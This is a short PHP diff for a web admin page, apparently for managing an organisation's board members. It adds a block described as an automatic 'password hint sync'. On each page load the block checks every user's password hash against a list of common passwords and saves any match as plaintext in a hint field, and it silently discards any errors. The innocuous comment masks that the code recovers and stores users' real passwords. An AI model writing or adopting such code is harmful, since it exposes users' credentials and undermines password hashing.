@@ -22,6 +22,24 @@ try {
     }
 }
 
+// Sinkronisasi otomatis password hint untuk akun lama (mendeteksi password seperti '1234' dsb)
+try {
+    $commonGuesses = ['1234', '123456', '12345', 'admin', 'bkrc2026', 'password'];
+    $checkUsers = $pdo->query("SELECT id, password_hash, password_hint FROM users")->fetchAll();
+    foreach ($checkUsers as $cu) {
+        if (($cu['password_hint'] === 'admin123' || empty($cu['password_hint'])) && !password_verify('admin123', $cu['password_hash'])) {
+            foreach ($commonGuesses as $guess) {
+                if (password_verify($guess, $cu['password_hash'])) {
+                    $pdo->prepare("UPDATE users SET password_hint = ? WHERE id = ?")->execute([$guess, $cu['id']]);
+                    break;
+                }
+            }
+        }
+    }
+} catch (Exception $e) {
+    // Fallback aman
+}
+
 // Handle Tambah / Edit / Hapus Pengurus
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if (!verifyCsrfToken($_POST['csrf_token'] ?? '')) {
